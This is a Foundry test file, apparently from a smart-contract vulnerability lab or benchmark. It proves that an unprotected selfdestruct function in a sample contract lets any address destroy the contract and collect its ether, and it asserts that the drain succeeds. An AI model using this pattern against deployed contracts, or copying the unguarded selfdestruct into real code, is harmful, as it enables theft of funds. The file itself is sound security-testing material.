
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleSuicide} from "../src/SimpleSuicide.sol";

contract TestAccessControlSimpleSuicide is Test {
    SimpleSuicide public simpleSuicide;

    function setUp() public {
        simpleSuicide = new SimpleSuicide();
        // Fund the contract so we can verify funds are transferred on selfdestruct
        vm.deal(address(simpleSuicide), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // No privileged roles exist in this contract - anyone can call sudicideAnyone
        // This is the vulnerability we are proving

        // --- 2. State Configuration ---
        // Record caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(simpleSuicide).balance;

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected selfdestruct function
        // If vulnerable: call succeeds and contract is destroyed, funds sent to caller
        // If secure: call would revert (but this contract has no access control)
        simpleSuicide.sudicideAnyone();

        // Assert the vulnerability was exploited successfully
        // The contract should be destroyed and its funds transferred to the caller
        assertEq(address(simpleSuicide).balance, 0, "Contract balance should be zero after selfdestruct");
        assertEq(caller.balance, callerBalanceBefore + contractBalance, "Caller should receive contract funds");
    }
}
